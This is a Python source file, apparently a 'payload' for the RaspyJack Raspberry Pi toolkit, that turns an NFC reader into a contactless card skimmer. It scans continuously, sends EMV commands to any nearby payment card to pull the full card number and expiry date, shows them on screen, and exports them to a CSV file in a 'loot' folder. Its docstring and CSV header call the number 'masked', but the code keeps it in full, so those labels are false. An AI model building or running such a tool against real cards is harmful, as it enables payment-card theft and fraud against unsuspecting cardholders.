#!/usr/bin/env python3
"""
RaspyJack Payload -- NFC Scanner
==================================
Continuous NFC detection. Shows card type, UID, and for EMV
cards extracts the masked PAN and app name on the fly.

Controls:
  OK         Toggle scanning
  UP/DOWN    Scroll history
  KEY2       Export CSV log
  KEY3       Exit
"""

import os
import sys
import time
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button
from payloads.nfc_rfid._nfc_driver import auto_detect, is_emv, is_classic, is_ultralight

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
WIDTH, HEIGHT = LCD_1in44.LCD_WIDTH, LCD_1in44.LCD_HEIGHT
LOOT_DIR = "/root/Raspyjack/loot/NFC"
DEBOUNCE = 0.18
_last_btn = 0

EMV_AIDS = [
    ("Visa", "A0000000031010"), ("MC", "A0000000041010"),
    ("CB", "A0000000421010"), ("Amex", "A00000002501"),
    ("JCB", "A0000000651010"), ("Disc", "A0000001523010"),
]


def _btn():
    global _last_btn
    b = get_button(PINS, GPIO)
    now = time.time()
    if b and now - _last_btn < DEBOUNCE:
        return None
    if b:
        _last_btn = now
    return b


def _quick_emv(drv):
    """Fast EMV probe: get app name, full PAN, expiry."""
    ppse = bytes.fromhex("00A404000E325041592E5359532E444446303100")
    resp = drv.data_exchange(ppse)
    if not resp or len(resp) < 6:
        return None, None, None

    app_name = ""
    pan_full = ""
    expiry = ""

    for name, aid in EMV_AIDS:
        aid_b = bytes.fromhex(aid)
        apdu = bytes.fromhex("00A40400") + bytes([len(aid_b)]) + aid_b + b"\x00"
        resp = drv.data_exchange(apdu)
        if not resp or len(resp) <= 4:
            continue
        app_name = name

        gpo = bytes.fromhex("80A8000002830000")
        gpo_resp = drv.data_exchange(gpo)
        if not gpo_resp:
            break

        afl = b""
        i = 0
        while i < len(gpo_resp) - 1:
            if gpo_resp[i] == 0x94:
                ln = gpo_resp[i + 1]
                afl = gpo_resp[i + 2:i + 2 + ln]
                break
            i += 1

        sfis = []
        if afl:
            for j in range(0, len(afl), 4):
                if j + 3 >= len(afl):
                    break
                sfi = (afl[j] >> 3) & 0x1F
                first = afl[j + 1]
                last = afl[j + 2]
                for rec in range(first, min(last + 1, first + 2)):
                    sfis.append((sfi, rec))
        else:
            sfis = [(1, 1), (2, 1), (1, 2)]

        for sfi, rec in sfis[:4]:
            p2 = (sfi << 3) | 0x04
            rr = drv.data_exchange(bytes([0x00, 0xB2, rec, p2, 0x00]))
            if not rr or len(rr) < 10:
                continue
            h = rr.hex().upper()
            for marker in ["57", "5A"]:
                idx = 0
                while idx < len(h) - 4:
                    if h[idx:idx+2] == marker:
                        ln = int(h[idx+2:idx+4], 16)
                        data = h[idx+4:idx+4+ln*2]
                        if "D" in data:
                            pan_full = data.split("D")[0]
                            trail = data.split("D")[1]
                            if len(trail) >= 4:
                                expiry = f"{trail[2:4]}/20{trail[0:2]}"
                        elif "F" in data:
                            pan_full = data.rstrip("F")
                        else:
                            pan_full = data
                        break
                    idx += 2
                if pan_full:
                    break
            if pan_full:
                break
        break

    return app_name, pan_full, expiry


def _type_color(card_type):
    if "Classic" in card_type or "Mini" in card_type:
        return "#00CCFF"
    if "Ultralight" in card_type or "NTAG" in card_type:
        return "#FF00FF"
    if "DESFire" in card_type:
        return "#FFAA00"
    if "EMV" in card_type or "ISO" in card_type:
        return "#FF4444"
    return "#888"


def main():
    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    LCD_Config.GPIO_Init()
    lcd = LCD_1in44.LCD()
    lcd.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    lcd.LCD_Clear()

    font = scaled_font(10)
    font_sm = scaled_font(9)

    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((4, 50), "Detecting reader...", font=font_sm, fill="#FFAA00")
    lcd.LCD_ShowImage(img, 0, 0)

    drv, drv_desc = auto_detect()
    scanning = False
    history = []
    unique_uids = set()
    scroll = 0
    status = drv_desc if drv else "No reader"
    last_scan = 0

    try:
        while True:
            btn = _btn()
            if btn == "KEY3":
                break
            if btn == "OK":
                if not drv:
                    drv, drv_desc = auto_detect()
                    status = drv_desc
                else:
                    scanning = not scanning
                    status = "Scanning..." if scanning else "Paused"
            if btn == "UP":
                scroll = max(0, scroll - 1)
            elif btn == "DOWN":
                scroll += 1
            if btn == "KEY2" and history:
                os.makedirs(LOOT_DIR, exist_ok=True)
                ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                path = os.path.join(LOOT_DIR, f"scan_log_{ts}.csv")
                with open(path, "w") as f:
                    f.write("timestamp,uid,type,emv_app,pan_masked,count\n")
                    for h in history:
                        f.write(f"{h['ts']},{h['uid']},{h['type']},"
                                f"{h.get('emv_app','')},{h.get('pan','')},{h['count']}\n")
                status = f"Saved {len(history)} entries"

            # Scan
            if scanning and drv and time.time() - last_scan > 0.3:
                card = drv.read_passive_target(timeout=1.0)
                last_scan = time.time()
                if card:
                    uid_hex = card.uid_hex
                    unique_uids.add(uid_hex)
                    existing = next((h for h in history if h["uid"] == uid_hex), None)
                    if existing:
                        existing["count"] += 1
                        existing["last"] = time.time()
                    else:
                        entry = {
                            "uid": uid_hex,
                            "type": card.card_type,
                            "ts": datetime.now().strftime("%H:%M:%S"),
                            "count": 1,
                            "last": time.time(),
                            "emv_app": "",
                            "pan": "",
                        }
                        # Quick EMV probe — any card with ISO-DEP capability (SAK bit 5)
                        if card.sak & 0x20 or is_emv(card) or "ISO" in card.card_type or "DESFire" in card.card_type:
                            app, pan, exp = _quick_emv(drv)
                            if app:
                                entry["emv_app"] = app
                                entry["type"] = app
                            if pan:
                                entry["pan"] = pan
                            if exp:
                                entry["expiry"] = exp

                        history.insert(0, entry)
                        scroll = 0

            # Draw
            img = Image.new("RGB", (WIDTH, HEIGHT), "black")
            d = ScaledDraw(img)
            d.rectangle((0, 0, 127, 14), fill="#111")
            d.text((2, 2), "NFC SCAN", font=font_sm, fill="#00CCFF")
            total = sum(h["count"] for h in history)
            d.text((60, 2), f"{len(unique_uids)}uniq/{total}tot", font=font_sm, fill="#888")
            scan_col = "#00FF00" if scanning else "#444"
            d.ellipse((120, 4, 125, 9), fill=scan_col)

            y = 18

            if not history:
                d.text((4, 50), "Press OK to start", font=font, fill="#666")
                if status:
                    d.text((4, 70), status[:22], font=font_sm, fill="#555")
            else:
                max_scroll = max(0, len(history) - 4)
                scroll = min(scroll, max_scroll)

                for i in range(scroll, min(len(history), scroll + 5)):
                    if y > 108:
                        break
                    h = history[i]
                    age = time.time() - h["last"]
                    fresh = age < 3

                    # Background highlight for fresh cards
                    if fresh:
                        d.rectangle((0, y - 1, 127, y + 22), fill="#0a1a0a")

                    # Line 1: type + UID
                    type_col = _type_color(h["type"])
                    d.text((2, y), h["type"][:10], font=font_sm, fill=type_col)
                    d.text((65, y), h["uid"][:12], font=font_sm, fill="#ccc" if fresh else "#666")
                    y += 12

                    # Line 2: PAN or count
                    if h.get("pan"):
                        pan_display = " ".join(h["pan"][i:i+4] for i in range(0, len(h["pan"]), 4))
                        d.text((4, y), pan_display[:22], font=font_sm, fill="#FF4444")
                        y += 12
                        # Line 3: expiry
                        if h.get("expiry"):
                            d.text((4, y), f"Exp: {h['expiry']}", font=font_sm, fill="#888")
                        y += 12
                    else:
                        d.text((4, y), f"x{h['count']}", font=font_sm, fill="#888")
                        d.text((90, y), h["ts"], font=font_sm, fill="#555")
                        y += 14

            d.rectangle((0, 116, 127, 127), fill="#111")
            d.text((2, 117), "OK:Scan K2:Export K3:X", font=font_sm, fill="#666")
            lcd.LCD_ShowImage(img, 0, 0)

            time.sleep(0.03)

    finally:
        if drv:
            drv.close()
        try:
            lcd.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
